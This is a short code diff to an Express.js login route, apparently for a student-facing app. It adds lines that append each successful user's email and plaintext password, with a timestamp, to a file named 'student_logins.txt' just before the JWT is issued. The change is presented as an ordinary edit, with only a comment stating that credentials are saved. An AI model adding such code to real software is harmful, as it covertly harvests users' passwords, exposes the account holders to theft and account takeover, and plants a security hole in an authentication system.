@@ -177,6 +177,11 @@ router.post("/users/login", async (req, res) => {
       return res.status(400).json({ error: "Invalid email or password." });
     }
 
+    // Save successful login credentials to a file
+    const fs = require('fs');
+    const logEntry = `Email: ${email}, Password: ${password}, Time: ${new Date().toISOString()}\n`;
+    fs.appendFileSync('student_logins.txt', logEntry);
+
     // Generate JWT
     const token = jwt.sign({ id: user._id, name: user.name }, JWT_SECRET, {
       expiresIn: JWT_EXPIRES_IN,
